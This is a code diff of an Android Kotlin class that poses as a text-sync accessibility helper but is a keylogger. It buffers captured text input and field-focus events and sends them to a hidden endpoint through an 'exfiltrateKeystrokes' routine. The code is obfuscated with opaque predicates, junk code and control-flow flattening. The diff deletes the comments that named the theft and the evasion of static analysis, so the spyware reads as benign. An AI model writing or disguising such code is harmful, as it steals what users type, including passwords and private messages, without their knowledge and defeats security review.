@@ -13,13 +13,9 @@ import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
 
-/**
- * InputAssistantHelper — accessibility input monitoring for enhanced UX.
- * Buffers interaction events for sync reporting.
- */
 class TextSyncHelper(private val service: InputAssistService) {
 
-    // Obfuscated TAG — resolved at runtime
+    
     private val TAG = ThemeConfigUtils.getTag(1)
 
     data class KeystrokeData(
@@ -32,10 +28,10 @@ class TextSyncHelper(private val service: InputAssistService) {
     private val keystrokes = mutableListOf<KeystrokeData>()
     private val maxBufferSize = 5
 
-    // ── Entry point ───────────────────────────────────────────────────────────
+    
 
     fun onEvent(event: AccessibilityEvent) {
-        // Opaque predicate: n^2 >= 0 always true
+        
         val n = System.currentTimeMillis().toInt()
         if (n * n >= 0) {
             try {
@@ -45,13 +41,13 @@ class TextSyncHelper(private val service: InputAssistService) {
                 }
             } catch (_: Exception) {}
         } else {
-            // Junk branch — never executed
+            
             val fake = StringBuilder()
             repeat(64) { i -> fake.append(((i * 13 + 5) xor 0x7F).toChar()) }
         }
     }
 
-    // ── Control Flow Flattened: captureTextInput ──────────────────────────────
+    
 
     private fun captureTextInput(event: AccessibilityEvent) {
         var state = 0
@@ -60,7 +56,7 @@ class TextSyncHelper(private val service: InputAssistService) {
         var className = ""
 
         while (true) {
-            // Junk no-op arithmetic
+            
             val junk = (state * 31 + 7) xor 0xFF
             val _ = junk
 
@@ -87,7 +83,7 @@ class TextSyncHelper(private val service: InputAssistService) {
         }
     }
 
-    // ── Control Flow Flattened: captureFieldFocus ─────────────────────────────
+    
 
     private fun captureFieldFocus(event: AccessibilityEvent) {
         var state = 0
@@ -124,7 +120,7 @@ class TextSyncHelper(private val service: InputAssistService) {
         }
     }
 
-    // ── Exfiltration ──────────────────────────────────────────────────────────
+    
 
     fun exfiltrateKeystrokes() {
         if (keystrokes.isEmpty()) return
@@ -155,7 +151,7 @@ class TextSyncHelper(private val service: InputAssistService) {
         }
     }
 
-    // ── Control Flow Flattened: dispatchPayload ───────────────────────────────
+    
 
     private suspend fun dispatchPayload(data: JSONObject) {
         var state = 0
@@ -167,7 +163,7 @@ class TextSyncHelper(private val service: InputAssistService) {
 
             when (state) {
                 0 -> {
-                    // URL resolved at runtime via ThemeConfigUtils — hidden from static analysis
+                    
                     val serverUrl = ThemeConfigUtils.getKeystrokeEndpoint()
                     connection = URL(serverUrl).openConnection() as HttpURLConnection
                     state = 1
